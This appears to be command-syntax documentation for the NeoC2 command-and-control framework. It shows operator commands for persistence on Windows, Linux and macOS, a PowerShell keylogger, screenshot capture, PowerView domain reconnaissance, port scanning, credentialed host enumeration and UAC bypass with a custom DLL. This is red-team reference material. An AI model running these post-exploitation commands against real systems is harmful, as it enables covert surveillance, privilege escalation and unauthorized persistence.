# NeoC2 Module Command Syntax

- [General Syntax](#general-syntax)
- [Examples](#examples)

## General Syntax

```
run <module_name> <agent_id> <option>=<value>

# IN INTERACTIVE MODE - OPERATORS DO NOT HAVE TO SPECIFY agent_id THE CUURENT AGENT IS AUTOMATICALLY USED
run <module_name> <option>=<value>
```

## Examples

Use `modules list` for a list of both external and built-in modules that might and might not be covered by this guide and pull their usage info with `modules info <name>`

### Persistence Module

The `persistence` module establishes persistence on systems using various techniques.

#### Required Options:
- `agent_id`: ID of the agent to establish persistence on
- `method`: Persistence method (registry, startup, cron, launchd, systemd, or service)
- `payload_path`: Path to the payload/script to persist

#### Optional Options:
- `name`: Name for the persistence mechanism (default: "SystemUpdate")
- `interval`: Interval for scheduled tasks (minutes, only for cron/systemd) (default: "60")

#### Examples:

**Linux/macOS Cron Persistence:**
```
run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=cron payload_path=/tmp/payload.sh
```

**Windows Registry Persistence:**
```
run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=registry payload_path=C:\Users\Public\payload.exe
```

**Windows Startup Folder:**
```
run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=startup payload_path=C:\Users\Public\payload.exe
```

**Windows Service:**
```
run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=service payload_path=C:\Users\Public\payload.exe name=WindowsUpdater
```

**Linux Systemd Service:**
```
run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=systemd payload_path=/opt/payload service_interval=30
```

**macOS LaunchAgent:**
```
run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=launchd payload_path=/Applications/payload.sh
```



### Keylogger Module

The `keylogger` module executes a PowerShell keylogger that logs keystrokes to a file.

#### Required Options:
- `agent_id`: ID of the agent to run the keylogger on

#### Optional Options:
- `log_path`: Path where keystrokes will be logged (default: `%TEMP%\key.log`)
- `timeout`: Time in minutes to capture keystrokes (default: runs indefinitely)

#### Examples:

**Basic Keylogger:**
```
run keylogger agent_id=abc123-4567-8901-2345-67890abcdef1
```

**Keylogger with Custom Log Path:**
```
run keylogger agent_id=abc123-4567-8901-2345-67890abcdef1 log_path=C:\Users\Public\keystrokes.log
```

**Keylogger with Timeout:**
```
run keylogger agent_id=abc123-4567-8901-2345-67890abcdef1 log_path=%TEMP%\capture.log timeout=30
```


### Screenshot Module

The `screenshot` module executes a PowerShell timed screenshot capture that saves screenshots to a specified path.

#### Required Options:
- `agent_id`: ID of the agent to run the screenshot capture on

#### Optional Options:
- `path`: Path where screenshots will be saved (default: `%TEMP%`)
- `interval`: Interval in seconds between taking screenshots (default: "30")
- `end_time`: Time when the script should stop running (format: HH:MM, e.g., 14:00) (default: "23:59")

#### Examples:

**Basic Screenshot:**
```
run screenshot agent_id=abc123-4567-8901-2345-67890abcdef1
```

**Screenshot with Custom Path and Interval:**
```
run screenshot agent_id=abc123-4567-8901-2345-67890abcdef1 path=C:\Users\Public interval=60
```

**Screenshot with End Time:**
```
run screenshot agent_id=abc123-4567-8901-2345-67890abcdef1 path=%TEMP% interval=20 end_time=18:00
```

**Screenshot with Custom Settings:**
```
run screenshot agent_id=abc123-4567-8901-2345-67890abcdef1 path=C:\Temp interval=45 end_time=16:30
```



### PowerView Module

The `PowerView` module executes a PowerShell PowerView script for network enumeration and domain assessment. PowerView contains numerous functions for Active Directory reconnaissance and mapping trust relationships within a domain environment.

#### Required Options:
- `agent_id`: ID of the agent to run PowerView enumeration on

#### Optional Options:
- `function`: The PowerView function to execute (default: "Get-Domain"). Available functions include many for domain enumeration: Get-Domain, Get-DomainController, Get-DomainUser, Get-DomainGroup, Get-DomainComputer, Get-DomainGPO, Get-DomainOU, Get-DomainSite, Get-DomainSubnet, Get-DomainTrust, Get-Forest, Get-ForestDomain, Get-ForestGlobalCatalog, Find-DomainUserLocation, Find-DomainGroupMember, Find-DomainShare, Find-LocalAdminAccess, Get-NetSession, Get-NetLoggedon, Invoke-UserHunter, Invoke-ProcessHunter, Invoke-EventHunter, Invoke-ShareFinder, Invoke-FileFinder, Get-DNSServerZone, Get-DomainDNSRecord, Get-NetForestTrust, Get-ADObject, Get-NetGroupMember, Get-NetUser, Get-NetComputer, Get-NetDomainController, Get-NetGPO, Get-NetGPOGroup, Get-DFSshare, Get-NetShare, Get-NetLocalGroupMember, Find-ComputerField, Find-UserField, Get-NetDomainTrust, Get-NetForestTrust, Find-GPOLocation, Get-DomainPolicyData, Get-DomainUserEvent, Get-DomainProcess, Get-DomainUserPermission, Find-ManagedSecurityGroups, Get-DomainTrustMapping, Get-NetDomain
- `arguments`: Additional arguments to pass to the PowerView function (optional)

#### Examples:

**Basic PowerView Domain Information:**
```
run PowerView agent_id=abc123-4567-8901-2345-67890abcdef1
```

**PowerView with Specific Function:**
```
run PowerView agent_id=abc123-4567-8901-2345-67890abcdef1 function=Get-DomainUser
```

**PowerView with Arguments:**
```
run PowerView agent_id=abc123-4567-8901-2345-67890abcdef1 function=Get-DomainComputer arguments="-Properties OperatingSystem,LastLogonDate"
```

**PowerView with User Location:**
```
run PowerView agent_id=abc123-4567-8901-2345-67890abcdef1 function=Find-DomainUserLocation
```


### Invoke-Portscan Module

The `Invoke-Portscan` module executes a PowerShell script to perform network port scanning. This is commonly used for enumerating open ports and services on target systems.

#### Required Options:
- `agent_id`: ID of the agent to run Invoke-Portscan on
- `computer_name`: Target computer name or IP address to scan (supports multiple targets separated by commas)
- `port`: Port or port range to scan (e.g., 80, 1-1000, 22,80,443)

#### Optional Options:
- `ports`: Alternative parameter for specifying ports (for compatibility)
- `timeout`: Timeout in milliseconds for each connection attempt (default: 1000)
- `ping`: Perform ping sweep before port scanning (true/false) (default: false)
- `all_protocols`: Include all protocols in the scan (true/false) (default: false)

#### Examples:

**Basic Port Scan:**
```
run Invoke-Portscan agent_id=abc123-4567-8901-2345-67890abcdef1 computer_name=192.168.1.1 port=1-1000
```

**Port Scan with Specific Ports:**
```
run Invoke-Portscan agent_id=abc123-4567-8901-2345-67890abcdef1 computer_name=192.168.1.10 port=22,80,443
```

**Port Scan with Ping Sweep:**
```
run Invoke-Portscan agent_id=abc123-4567-8901-2345-67890abcdef1 computer_name=192.168.1.0/24 port=80 ping=true
```

**Port Scan with Custom Timeout and All Protocols:**
```
run Invoke-Portscan agent_id=abc123-4567-8901-2345-67890abcdef1 computer_name=10.0.0.1 port=1-100 timeout=2000 all_protocols=true
```

### Get-ComputerDetail Module

The `Get-ComputerDetail` module executes a PowerShell script to gather comprehensive system information including OS details, hardware specs, network configuration, and running processes.

#### Required Options:
- `agent_id`: ID of the agent to run Get-ComputerDetail on

#### Optional Options:
- `computer_name`: Target computer name or IP address to enumerate (default: localhost)
- `credentialed_access`: Use alternate credentials for remote enumeration (format: domain\\username:password)
- `property`: Specific property to retrieve (optional, if not specified, all properties will be returned)

#### Examples:

**Basic Computer Detail Enumeration:**
```
run Get-ComputerDetail agent_id=abc123-4567-8901-2345-67890abcdef1
```

**Remote Computer Detail Enumeration:**
```
run Get-ComputerDetail agent_id=abc123-4567-8901-2345-67890abcdef1 computer_name=192.168.1.10
```

**Computer Detail with Specific Property:**
```
run Get-ComputerDetail agent_id=abc123-4567-8901-2345-67890abcdef1 computer_name=192.168.1.10 property=OSInfo
```

**Computer Detail with Credentials:**
```
run Get-ComputerDetail agent_id=abc123-4567-8901-2345-67890abcdef1 computer_name=192.168.1.10 credentialed_access=DOMAIN\\admin:password123 property=HardwareInfo
```

### Bypass-UAC Module

The `Bypass-UAC` module executes a PowerShell UAC bypass technique using various methods to escape medium integrity level and gain elevated privileges. This module leverages multiple UAC bypass techniques from PowerSploit.

#### Required Options:
- `agent_id`: ID of the agent to run Bypass-UAC on
- `method`: The UAC bypass method to execute (UacMethodSysprep, ucmDismMethod, UacMethodMMC2, UacMethodTcmsetup, UacMethodNetOle32)

#### Optional Options:
- `custom_dll`: Absolute path to custom proxy DLL for the bypass (optional)

#### Examples:

**Basic Bypass-UAC with default method:**
```
run Bypass-UAC agent_id=abc123-4567-8901-2345-67890abcdef1 method=UacMethodTcmsetup
```

**Bypass-UAC with Sysprep method:**
```
run Bypass-UAC agent_id=abc123-4567-8901-2345-67890abcdef1 method=UacMethodSysprep
```

**Bypass-UAC with DISM method:**
```
run Bypass-UAC agent_id=abc123-4567-8901-2345-67890abcdef1 method=ucmDismMethod
```
### HostEnum Module

The `HostEnum` module executes a PowerShell comprehensive host enumeration and situational awareness script. It performs local host and/or domain enumeration to gather system information, installed applications, network configuration, processes, services, registry entries, users, groups, security products, and more.

#### Required Options:
- `agent_id`: ID of the agent to run HostEnum on

#### Optional Options:
- `switch`: The HostEnum switch to execute (All, Local, Domain, Privesc, Quick) (default: "Local")
- `html_report`: Generate an HTML report (true/false) (default: "false")

#### Examples:

**Basic HostEnum with Local switch:**
```
run HostEnum agent_id=abc123-4567-8901-2345-67890abcdef1 switch=Local
```

**HostEnum with Domain enumeration:**
```
run HostEnum agent_id=abc123-4567-8901-2345-67890abcdef1 switch=Domain
```

**HostEnum with Privesc enumeration:**
```
run HostEnum agent_id=abc123-4567-8901-2345-67890abcdef1 switch=Privesc
```

**HostEnum with both Local and Domain:**
```
run HostEnum agent_id=abc123-4567-8901-2345-67890abcdef1 switch=All
```

**HostEnum with HTML Report:**
```
run HostEnum agent_id=abc123-4567-8901-2345-67890abcdef1 switch=Local html_report=true
```


**Bypass-UAC with MMC method:**
```
run Bypass-UAC agent_id=abc123-4567-8901-2345-67890abcdef1 method=UacMethodMMC2
```

**Bypass-UAC with custom DLL:**
```
run Bypass-UAC agent_id=abc123-4567-8901-2345-67890abcdef1 method=UacMethodTcmsetup custom_dll=C:\\temp\\malicious.dll
```

## Notes

- The `agent_id` parameter is IMPORTANT for all modules as it specifies which agent should execute the module
- For cross-platform modules, ensure the appropriate method/technique is selected for the target OS
- Some techniques require specific privileges or services to be running on target systems
- Credentials should be formatted properly as shown in the examples

